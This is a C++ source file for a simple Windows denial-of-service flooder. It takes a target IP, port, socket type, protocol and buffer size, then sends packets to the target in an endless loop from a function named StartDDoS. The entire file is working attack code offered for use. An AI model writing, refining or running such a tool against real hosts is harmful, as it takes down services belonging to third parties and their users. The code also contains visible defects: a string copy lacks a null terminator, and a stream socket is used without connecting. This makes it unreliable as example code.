#pragma once
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include<iostream>
#include<string>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>

#pragma comment(lib, "Ws2_32.lib")

struct PREPARED_DATA
{
    const char* ip;
    u_short port;
    uint32_t sock; // SOCK_STREAM || SOCK_DGRAM
    uint32_t protocol; // IPPROTO_TCP || IPPROTO_UDP
    uint32_t buff_size;
};

void StartDDoS(PREPARED_DATA data)
{
    int iResult;
    WSADATA wsaData;

    SOCKET SendSocket = INVALID_SOCKET;
    sockaddr_in RecvAddr;

    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != NO_ERROR) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return;
    }

    SendSocket = socket(AF_INET, data.sock, data.protocol);
    if (SendSocket == INVALID_SOCKET) {
        printf("Socket failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return;
    }

    RecvAddr.sin_family = AF_INET;
    RecvAddr.sin_port = htons(data.port);
    IN_ADDR* addr = new IN_ADDR();
    inet_pton(AF_INET, data.ip, addr);
    RecvAddr.sin_addr = *addr;

    printf("Attack started!\n");
    std::string generated_buff(data.buff_size,'0');

    while (true)
        sendto(SendSocket, generated_buff.c_str(), data.buff_size, 0, (SOCKADDR*)& RecvAddr, sizeof(RecvAddr));
}

std::string ReadSmth(const char* message)
{
    std::string inputed;
    std::cout << message << ": ";
    std::getline(std::cin, inputed);

    return inputed;
}

uint32_t SelectSock(std::string str)
{
    if (str == "STREAM")
        return SOCK_STREAM;
    if (str == "DIAGRAM")
        return SOCK_DGRAM;
    return SOCK_DGRAM;
}

uint32_t SelectProtocol(std::string str)
{
    if (str == "TCP")
        return IPPROTO_TCP;
    if (str == "UDP")
        return IPPROTO_UDP;
    return IPPROTO_UDP;
}

bool GetArgData(int argc, const char** argv, PREPARED_DATA& data)
{
    if (argc != 6)
        return false;

    data.ip = argv[1];
    data.port = std::atoi(argv[2]);
    std::string pp = argv[3];
    data.sock = SelectSock(pp);
    pp = argv[4];
    data.protocol = SelectProtocol(pp);
    data.buff_size = std::atoi(argv[5]);

    return true;
}

const char* CopyStr(std::string str)
{
    char* planned_str = new char[str.size()];
    std::copy_n(str.c_str(), str.size(), planned_str);

    return planned_str;
}

int main(int argc, const char** argv)
{
    PREPARED_DATA data;
    if (!GetArgData(argc, argv, data))
    {
        data.ip = CopyStr(ReadSmth("IP"));
        data.port = std::atoi(CopyStr(ReadSmth("PORT")));
        data.sock = SelectSock(ReadSmth("SOCKET (STREAM || DIAGRAM)"));
        data.protocol = SelectProtocol(ReadSmth("PROTOCOL (TCP || UDP)"));
        data.buff_size = std::atoi(ReadSmth("BUFF_SIZE (Bytes)").c_str());
    }
    std::cout << data.ip << std::endl;
    printf("Starting with params:\nIP: %s\nPORT: %d\nSOCK: %d\nPROTOCOL: %d\nBUFF_SIZE (Bytes): %d\n",
        data.ip,data.port,data.sock,data.protocol,data.buff_size);

    StartDDoS(data);
}